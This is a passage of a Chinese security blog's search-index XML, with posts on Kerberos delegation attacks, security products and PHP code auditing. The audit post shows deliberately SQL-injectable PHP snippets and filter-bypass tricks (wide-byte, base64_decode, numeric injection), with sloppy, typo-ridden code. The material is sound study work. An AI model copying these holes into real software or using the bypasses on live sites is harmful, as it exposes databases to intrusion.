            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA内存马</title>
      <link href="/2025/04/06/java-nei-cun-ma/"/>
      <url>/2025/04/06/java-nei-cun-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA内存马"><a href="#JAVA内存马" class="headerlink" title="JAVA内存马"></a>JAVA内存马</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>委派攻击</title>
      <link href="/2024/10/25/wei-pai-gong-ji/"/>
      <url>/2024/10/25/wei-pai-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h1><blockquote><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。 </p><p><strong>简言之：当A访问服务B时，服务B拿着A用户的凭证去访问服务C，这个过程称为委派。</strong></p></blockquote><h2 id="委派攻击分为三种攻击手段"><a href="#委派攻击分为三种攻击手段" class="headerlink" title="委派攻击分为三种攻击手段"></a>委派攻击分为三种攻击手段</h2><ul><li>非约束委派攻击 </li><li>委派攻击 </li><li>资源委派攻击</li></ul><h2 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h2><p>在域内只有主机账号和服务账号才有委派属性</p><p>主机账号：活动目录中的computers组内的计算机，也被称为机器账号。 </p><p>服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer,MYSQL等；域用户通过注册SPN也能成为服务账号。</p><h3 id="非约束委派大致流程"><a href="#非约束委派大致流程" class="headerlink" title="非约束委派大致流程"></a>非约束委派大致流程</h3><p>user访问serverA，于是向DC发起认证，DC会检查serverA的机器账号的属性，如果是非约束委派的 话，会把用户的TGT放在ST票据中并一起发送给serverA 这样serverA在验证ST票据的同时也获取到了 用户的TGT，并把TGT储存在自己的lsass进程中以备下次重用，从而serverA就可以使用这个TGT，来 模拟这个user访问任何服务。 </p><p>简单一些 </p><p>user访问serverA，于是向DC发起认证，DC会检查serverA的机器账号的属性，如果是非约束委派的 话，会把用户的TGT放在ST票据中并一起发送给serverA 这样serverA在验证ST票据的同时也获取到了 用户的TGT，并把TGT储存在自己的lsass进程中以备下次重用，从而serverA就可以使用这个TGT，来 模拟这个user访问任何服务。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全产品</title>
      <link href="/2024/10/17/wang-luo-an-quan-chan-pin/"/>
      <url>/2024/10/17/wang-luo-an-quan-chan-pin/</url>
      
        <content type="html"><![CDATA[<h1 id="网络安全产品"><a href="#网络安全产品" class="headerlink" title="网络安全产品"></a>网络安全产品</h1><p><img src="https://pic.imgdb.cn/item/6710ad39d29ded1a8cf169db.png"></p><h3 id="边界安全–防火墙"><a href="#边界安全–防火墙" class="headerlink" title="边界安全–防火墙"></a>边界安全–防火墙</h3><h4 id="防火墙功能"><a href="#防火墙功能" class="headerlink" title="防火墙功能"></a>防火墙功能</h4><ul><li>访问控制ACL</li><li>地址转换NAT</li><li>带宽管理功能</li><li>用户认证</li><li>高可用性</li></ul><h4 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h4><ul><li>ACL</li><li>监控流经防火墙的日志</li></ul><h4 id="防火墙类型"><a href="#防火墙类型" class="headerlink" title="防火墙类型"></a>防火墙类型</h4><ol><li><p>包过滤防火墙（网络层防火墙）</p></li><li><p>应用代理防护墙（应用层防火墙）</p></li></ol><p>三层部署模式：</p><ul><li>透明模式（二层包转发）</li><li>路由模式（三层）</li><li>混合模式（二三层结合）</li></ul><h3 id="边界安全–抗DDOS"><a href="#边界安全–抗DDOS" class="headerlink" title="边界安全–抗DDOS"></a>边界安全–抗DDOS</h3><p>DDOS攻击：利用合理的服务请求来占用过多的服务资源，从而使服务器无法处理合法用户的请求。</p><p>DDOS防火墙:利用其独特的抗攻击算法，可有效防御Dos/DDoS、代理CC、ICMP、SYN、ARP攻击、SYNFLOOD等多种未知攻击:</p><h3 id="边界安全–网闸"><a href="#边界安全–网闸" class="headerlink" title="边界安全–网闸"></a>边界安全–网闸</h3><p>网闸是一种网络安全设备,主要用于隔离和保护内部网络免受外部网络的直接访问和攻击。它的主要功能有:</p><ol><li>网络隔离:将内部网络与外部网络物理隔离,控制内外网数据的流向。</li><li>访问控制:根据事先制定的安全策略,对进出内外网的数据流进行检查和控制,只允许合法和必要的流量通过。</li><li>入侵检测和防御:监测并阻挡各种网络攻击行为,如病毒、木马、DDoS攻击等。</li><li>网络地址转换(NAT):对内部网络地址进行转换,隐藏内部网络结构。</li><li>日志记录:记录网络访问和安全事件的日志,为事后分析和溯源提供依据。</li></ol><h3 id="应用安全–IPS"><a href="#应用安全–IPS" class="headerlink" title="应用安全–IPS"></a>应用安全–IPS</h3><p>IPS入侵防御系统内嵌在源和目标之间的网络流量中，通常位于防火墙后面，使用多种技术来识别威胁:</p><p>网络入侵防御系统(NIPS): 这种类型的 IPS 仅安装在战略点，以监控所有网络流量并主动扫描威胁。<br>主机入侵防御系统(HIPS):与 NIPS 相比，HIPS 安装在端点(例如 PC)上，仅查看来自该机器的入站和出站流量。它与 NIPS 结合使用效果最好，因为它可以作为威胁通过NIPS 的最后一道防线。</p><h3 id="应用安全–WAF"><a href="#应用安全–WAF" class="headerlink" title="应用安全–WAF"></a>应用安全–WAF</h3><p>WAF：是以网站或应用系统为核心的安全产品，通过对HTTP或HTTPS的Web攻击行为进行分析并拦截，有效的降低网站安全风险，产品主要部署在网站服务器的前方。</p><p>一般部署在web服务器之前，防止服务器被攻击</p><h3 id="负载均衡LB"><a href="#负载均衡LB" class="headerlink" title="负载均衡LB"></a>负载均衡LB</h3><p>负载均衡：分为链路负载、服务器负载和全局负载，在现有网络结构之上，它提供了一种廉价有效透明的方法扩展网络设备和服务器的带宽、增加吞吐量、加强网络数据处理能力、提高网络的灵活性和可用性。</p><p><img src="https://pic.imgdb.cn/item/6711c293d29ded1a8c07353f.png"></p><h3 id="上网行为管理AC"><a href="#上网行为管理AC" class="headerlink" title="上网行为管理AC"></a>上网行为管理AC</h3><p>上网行为管理：具备强大的用户认证、应用控制、网页过滤、外发审计、带宽管理等功能，可对内部的员工上网行为进行全方位的管理和实名制审计，起到保护Web访问安全提升工作效率、避免企业机密信息泄露及法律风险、保障企业核心业务带宽等作用。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计</title>
      <link href="/2024/10/14/php-dai-ma-shen-ji/"/>
      <url>/2024/10/14/php-dai-ma-shen-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h1><h2 id="代码审计流程"><a href="#代码审计流程" class="headerlink" title="代码审计流程"></a>代码审计流程</h2><h3 id="1-反向查找流程"><a href="#1-反向查找流程" class="headerlink" title="1.反向查找流程"></a>1.反向查找流程</h3><ol><li>通过可控变量(输入点)回溯危险函数</li><li>查找危险函数确定可控变量</li><li>传递的过程中触发漏洞</li></ol><h4 id="反向漏洞挖掘特点"><a href="#反向漏洞挖掘特点" class="headerlink" title="反向漏洞挖掘特点"></a>反向漏洞挖掘特点</h4><ul><li>根源：<strong>危险函数导致漏洞</strong></li><li>特点:<ul><li>暴力：全局搜索危险函数</li><li>简单：无需过多理解目标网站功能与架构</li><li>快速：适用于自动化代码审计工具</li><li>命中率低：简单的漏洞越来越少</li><li>无法挖掘逻辑漏洞：逻辑漏洞多数不存在危险函数，或危险函数的参数“看似”不可控</li><li>适应性较差：不适合存在全局过滤的站点</li></ul></li></ul><h3 id="2-正向查找流程"><a href="#2-正向查找流程" class="headerlink" title="2.正向查找流程"></a>2.正向查找流程</h3><ol><li>从入口点函数出发</li><li>找到控制器，理解URL派发规则</li><li>跟踪控制器调用，以理解代码为目标进行源码阅读</li><li>阅读代码的过程中，可能发现漏洞</li></ol><h4 id="正向漏洞挖掘特点"><a href="#正向漏洞挖掘特点" class="headerlink" title="正向漏洞挖掘特点"></a>正向漏洞挖掘特点</h4><p>根源：<strong>程序员疏忽或逻辑问题导致漏洞</strong><br>特点：</p><ul><li>复杂：需要及其了解目标源码的功能与架构</li><li>跳跃性大：涉及M/V/C/Service/Dao等多个层面</li><li>漏洞的组合：通常是多个漏洞的组合，很可能存在逻辑相关的漏洞</li><li>潜力无限：安全研究人员的宝库</li></ul><h3 id="3-双向查找流程"><a href="#3-双向查找流程" class="headerlink" title="3.双向查找流程"></a>3.双向查找流程</h3><ul><li>略读代码，了解架构</li><li>是否有全局过滤机制?<ul><li>有：是否可以绕过?<ul><li>可以：寻找漏洞触发点。</li><li>不可以：寻找没有过滤的变量。</li></ul></li><li>没有：那么它是如何处理的?<ul><li>完全没有处理：可以挖成筛子。</li><li>有处理:：找遗漏的处理点。</li></ul></li></ul></li><li>找到了漏洞点，漏洞利用是否有坑?<ul><li>否：成功利用!</li><li>是：利用所知的语言知识(trick)解决问题。</li></ul></li></ul><p>双向漏洞挖掘特点：</p><ul><li>根源：理解程序执行过程，找寻危险逻辑</li><li>特点：<ul><li>高效：如挖隧道，双向开工，时间减半</li><li>知识面广：需要同时掌握正向、反向挖掘技巧，并进行结合</li><li>以及所有正向、反向的优点</li></ul></li></ul><h2 id="SQL注入漏洞挖掘技巧"><a href="#SQL注入漏洞挖掘技巧" class="headerlink" title="SQL注入漏洞挖掘技巧"></a>SQL注入漏洞挖掘技巧</h2><ol><li>PHP+MySQL连接方式</li></ol><ul><li>MySQL（废弃）</li><li>Mysqli[^1]</li><li>PDO[^2]</li></ul><ol start="2"><li>SQL注入漏洞常见过滤方法</li></ol><ul><li>intval[^3]/addslashes[^4] /mysql_real_escape（三个函数）</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = intval($_GET['id']);</span><br><span class="line">echo $id;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = addslashes($_GET['id']);</span><br><span class="line">// ' ==&gt; \'</span><br><span class="line">// " ==&gt; \"</span><br><span class="line">// \ ==&gt; \\</span><br><span class="line">// \x00 ==&gt; \0</span><br><span class="line">echo $id;</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/670f7080d29ded1a8c011ac1.png"></p><ul><li><p>mysqli_escape_string /mysqli_real_escape_string / mysqli::escape_string</p></li><li><p>PDO::quote</p></li><li><p>参数化查询</p></li></ul><h3 id="常见注入过滤绕过方法"><a href="#常见注入过滤绕过方法" class="headerlink" title="常见注入过滤绕过方法"></a>常见注入过滤绕过方法</h3><ul><li><p>intval</p></li><li><p>addslashes /mysql_real_escape</p><ul><li><p>宽字符注入</p></li><li><p>寻找字符串转换函数</p><ul><li>urldecode</li><li>base64_decode</li></ul>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = addslashes($_GET['id']);</span><br><span class="line"></span><br><span class="line">$id = base64_decode($id);//当出现这个语句，那么只要传入的是base64加密语法，不存在引号，并且存在解码base64，那么就是绕过了</span><br><span class="line"></span><br><span class="line">$sql = "SELECT * FROM abc WHERE id = '$id' "//字符型</span><br></pre></td></tr></tbody></table></figure><ul><li>iconv</li><li>json_decode</li><li>stripshasles</li><li>simple_xml_loadstring</li></ul></li></ul></li><li><p>mysqli::escape_string / PDO::quote</p><ul><li><p>与addslashes区别：<strong>是否会主动加引号包裹</strong></p>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = addslashes($_GET['id']);</span><br><span class="line"></span><br><span class="line">$sql = "SELECT * FROM abc WHERE id = $id "//数字型，不存在引号，addslashes无效</span><br></pre></td></tr></tbody></table></figure></li><li><p>宽字符注入</p></li></ul></li><li><p>参数化查询</p><ul><li>寻找非SQL值位置（下面的？处为SQL值，其他为非SQL值）</li><li>SELECT `name` FROM `users` WHERE `id` = <strong>?</strong>  ORDER BY `login_time` LIMIT 1</li></ul></li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ol><li>寻找遗漏过滤的利用点</li></ol><ul><li>案例：贷齐乐系统header注入</li><li>略读代码，了解架构<ul><li>非MVC架构</li><li>全局GPC转义</li></ul></li><li>目标：找到没有进行过滤的输入点</li><li>结果：$_SERVER[HTTP_*]均无过滤，导致注入</li><li>入手点<ul><li>开发者不熟悉的边缘功能</li><li>常被复制粘贴代码的功能</li></ul></li></ul><ol start="2"><li>寻找过滤无效的利用点</li></ol><ul><li>案例：ThinkSNS某版本SOL注入漏洞</li><li>略读代码，了解架构<ul><li>基于ThinkPHP3.1开发</li><li>MVC架构</li><li>利用t函数过滤变量</li></ul></li><li>目标：找到t函数过滤完成以后也可以注入的点</li><li>结果：表名位置SQL注入漏洞</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function t($text){</span><br><span class="line">$text = nl2br($text);</span><br><span class="line">$text = real_strip_tags($text);//去除字符串中PHP和HTML标签  绕过思路：s&lt;a&gt;elect</span><br><span class="line">$text = addslashes($text);//转义</span><br><span class="line">$text = trim($text);//去除字符串首尾处的空白字符</span><br><span class="line">return $text;</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>寻找过滤可被绕过的利用点</li></ol><ul><li>案例：Metinfo企业网站管理系统SOL注入漏洞</li><li>略读代码，了解架构<ul><li>非MVC架构</li><li>全局覆盖的方式注册变量</li><li>全局GPC转义</li></ul></li><li>目标：获取绕过全局GPC的方法</li><li>结果：利用base64_decode来引入单引号</li></ul><h3 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h3><ol><li>开发者容易遗漏的输入点</li></ol><ul><li><p>HTTP头</p><ul><li><p>X-Forwarded-For</p></li><li><p>User-Agent</p></li><li><p>Referer</p></li></ul></li><li><p>PHP SELF</p></li><li><p>REQUEST URI</p></li><li><p>文件名 $_FILES[][name]</p></li><li><p>php://input</p></li></ul><ol start="2"><li>引入单引号(转义符)的方法</li></ol><ul><li>stripslashes</li><li>base64_decode</li><li>urldecode</li><li>substr</li><li>iconv</li><li>str_replace(‘0’,”,$sql)</li><li>xml</li><li>json encode</li></ul><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>（1）存在SQL注入漏洞</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./common. php';</span></span><br><span class="line"><span class="string">try{</span></span><br><span class="line"><span class="string"><span class="subst">$name</span> = <span class="subst">$_GET</span>['name'];//</span></span><br><span class="line"><span class="string"><span class="subst">$query</span> = "</span>SELECT name, age, email, country FROM user_details where name =<span class="string">'{$name}'</span>;<span class="string">";</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span> = <span class="subst">$conn</span>-&gt;prepare(<span class="subst">$query</span>);</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;execute();</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;bindColumn("</span>ema1l<span class="string">', $email);</span></span><br><span class="line"><span class="string">while($row= $stmt-&gt;fetch(PDO::FETCH_BOUND)){</span></span><br><span class="line"><span class="string">echo "$email"."&lt;br&gt;";</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}catch(PDOException $e){</span></span><br><span class="line"><span class="string">echo $e-&gt;getMessage();</span></span><br><span class="line"><span class="string">}</span></span><br></pre></td></tr></tbody></table></figure><p>（2）不存在SQL注入漏洞，不考虑宽字节</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./common.php';</span></span><br><span class="line"><span class="string">try{</span></span><br><span class="line"><span class="string"><span class="subst">$name</span> = addslashes(<span class="subst">$_GET</span>['name']);//</span></span><br><span class="line"><span class="string"><span class="subst">$query</span> = "</span>SELECT name, age, email, country FROM user_details where name =<span class="string">'{$name}'</span>;<span class="string">";</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span> = <span class="subst">$conn</span>-&gt;prepare(<span class="subst">$query</span>);</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;execute();</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;bindColumn("</span>ema1l<span class="string">', $email);</span></span><br><span class="line"><span class="string">while($row= $stmt-&gt;fetch(PDO::FETCH_BOUND)){</span></span><br><span class="line"><span class="string">echo "$email"."&lt;br&gt;";</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}catch(PDOException $e){</span></span><br><span class="line"><span class="string">echo $e-&gt;getMessage();</span></span><br><span class="line"><span class="string">}</span></span><br></pre></td></tr></tbody></table></figure><p>（3）存在SQL注入漏洞，未设置ENT_QUOTES参数，单引号不会被转换</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">’<span class="title function_ invoke__">htmlspecialchars</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$string</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$flags</span> = ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401,</span><br><span class="line">    ?<span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$double_encode</span> = <span class="literal">true</span></span><br><span class="line">): <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./common.php';</span></span><br><span class="line"><span class="string">try{</span></span><br><span class="line"><span class="string"><span class="subst">$name</span> = htmlspecialchars(<span class="subst">$_GET</span>['name']);//将特殊字符转换为 HTML 实体,未设置ENT_QUOTES参数，单引号不会被转换</span></span><br><span class="line"><span class="string"><span class="subst">$query</span> = "</span>SELECT name, age, email, country FROM user_details where name =<span class="string">'{$name}'</span>;<span class="string">";</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span> = <span class="subst">$conn</span>-&gt;prepare(<span class="subst">$query</span>);</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;execute();</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;bindColumn("</span>ema1l<span class="string">', $email);</span></span><br><span class="line"><span class="string">while($row= $stmt-&gt;fetch(PDO::FETCH_BOUND)){</span></span><br><span class="line"><span class="string">echo "$email"."&lt;br&gt;";</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}catch(PDOException $e){</span></span><br><span class="line"><span class="string">echo $e-&gt;getMessage();</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></tbody></table></figure><table><thead><tr><th align="left"><code>&amp;</code> (&amp; 符号)</th><th align="left"><code>&amp;</code></th></tr></thead><tbody><tr><td align="left">字符</td><td align="left">替换后</td></tr><tr><td align="left"><code>"</code> (双引号)</td><td align="left"><code>"</code>，除非设置了 <strong><code>ENT_NOQUOTES</code></strong></td></tr><tr><td align="left"><code>'</code> (单引号)</td><td align="left">设置了 <strong><code>ENT_QUOTES</code></strong> 后， <code>'</code> (如果是 <strong><code>ENT_HTML401</code></strong>) ，或者 <code>'</code> (如果是 **<code>ENT_XML1</code>**、 <strong><code>ENT_XHTML</code></strong> 或 <strong><code>ENT_HTML5</code></strong>)。</td></tr><tr><td align="left"><code>&lt;</code> (小于)</td><td align="left"><code>&lt;</code></td></tr><tr><td align="left"><code>&gt;</code> (大于)</td><td align="left"><code>&gt;</code></td></tr></tbody></table><p>（4）存在SQL注入漏洞，数字型注入可绕过</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./common.php';</span></span><br><span class="line"><span class="string">try{</span></span><br><span class="line"><span class="string"><span class="subst">$name</span> = addslashes(<span class="subst">$_GET</span>['age']);</span></span><br><span class="line"><span class="string">//<span class="subst">$query</span> = "</span>SELECT name, age, email, country FROM user_details where age &gt;{<span class="variable">$age</span>};<span class="string">";</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span> = <span class="subst">$conn</span>-&gt;prepare(<span class="subst">$query</span>);</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;execute();</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;bindColumn("</span>ema1l<span class="string">', $email);</span></span><br><span class="line"><span class="string">while($row= $stmt-&gt;fetch(PDO::FETCH_BOUND)){</span></span><br><span class="line"><span class="string">echo "$email"."&lt;br&gt;";</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}catch(PDOException $e){</span></span><br><span class="line"><span class="string">echo $e-&gt;getMessage();</span></span><br><span class="line"><span class="string">}</span></span><br></pre></td></tr></tbody></table></figure><p>（5）存在SQL注入，如果输入\‘ =&gt; \\‘，那么斜杠被转义，单引号未被转义</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./common.php';</span></span><br><span class="line"><span class="string">try{</span></span><br><span class="line"><span class="string"><span class="subst">$name</span> = str_replace("</span><span class="string">'","\\'</span><span class="string">",<span class="subst">$_GET</span>['name']);//    ' ==&gt; \'  思路：\' =&gt; \\'，那么</span></span><br><span class="line"><span class="string"><span class="subst">$query</span> = "</span>SELECT name, age, email, country FROM user_details where name =<span class="string">'{$name}'</span>;<span class="string">";</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span> = <span class="subst">$conn</span>-&gt;prepare(<span class="subst">$query</span>);</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;execute();</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;bindColumn("</span>ema1l<span class="string">', $email);</span></span><br><span class="line"><span class="string">while($row= $stmt-&gt;fetch(PDO::FETCH_BOUND)){</span></span><br><span class="line"><span class="string">echo "$email"."&lt;br&gt;";</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}catch(PDOException $e){</span></span><br><span class="line"><span class="string">echo $e-&gt;getMessage();</span></span><br><span class="line"><span class="string">}</span></span><br></pre></td></tr></tbody></table></figure><p>（6）不存在SQL注入</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br><span class="line">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 <span class="keyword">int</span> 数值。 <span class="title function_ invoke__">intval</span>() 不能用于 <span class="keyword">object</span>，否则会产生 E_WARNING 错误并返回 <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./common.php';</span></span><br><span class="line"><span class="string">try{</span></span><br><span class="line"><span class="string"><span class="subst">$id</span> = intval(<span class="subst">$_GET</span>['id']);//获取变量的整数值</span></span><br><span class="line"><span class="string"><span class="subst">$query</span> = "</span>SELECT name, age, email, country FROM user_details where id =<span class="string">'{$id}'</span>;<span class="string">";</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span> = <span class="subst">$conn</span>-&gt;prepare(<span class="subst">$query</span>);</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;execute();</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;bindColumn("</span>ema1l<span class="string">', $email);</span></span><br><span class="line"><span class="string">while($row= $stmt-&gt;fetch(PDO::FETCH_BOUND)){</span></span><br><span class="line"><span class="string">echo "$email"."&lt;br&gt;";</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}catch(PDOException $e){</span></span><br><span class="line"><span class="string">echo $e-&gt;getMessage();</span></span><br><span class="line"><span class="string">}</span></span><br></pre></td></tr></tbody></table></figure><p>（7）存在SQL注入，未把过滤后的内容传给查询语句</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./common.php';</span></span><br><span class="line"><span class="string">try{</span></span><br><span class="line"><span class="string">if(intval(<span class="subst">$_GET</span>['id'])){</span></span><br><span class="line"><span class="string"><span class="subst">$query</span> = "</span>SELECT name, age, email, country FROM user_details where id ={<span class="variable">$_GET</span>[<span class="string">'id'</span>]};<span class="string">";//未把过滤后的内容传给查询语句</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span> = <span class="subst">$conn</span>-&gt;prepare(<span class="subst">$query</span>);</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;execute();</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;bindColumn("</span>ema1l<span class="string">', $email);</span></span><br><span class="line"><span class="string">while($row= $stmt-&gt;fetch(PDO::FETCH_BOUND)){</span></span><br><span class="line"><span class="string">echo "$email"."&lt;br&gt;";</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}catch(PDOException $e){</span></span><br><span class="line"><span class="string">echo $e-&gt;getMessage();</span></span><br><span class="line"><span class="string">}</span></span><br></pre></td></tr></tbody></table></figure><p>（8）存在SQL注入，虽然有404，但是不影响下面的查询语句执行，应该把查询放到else里面</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./common.php';</span></span><br><span class="line"><span class="string">try{</span></span><br><span class="line"><span class="string">if(!is_numeric(<span class="subst">$_GET</span>['id'])){</span></span><br><span class="line"><span class="string">    header("</span><span 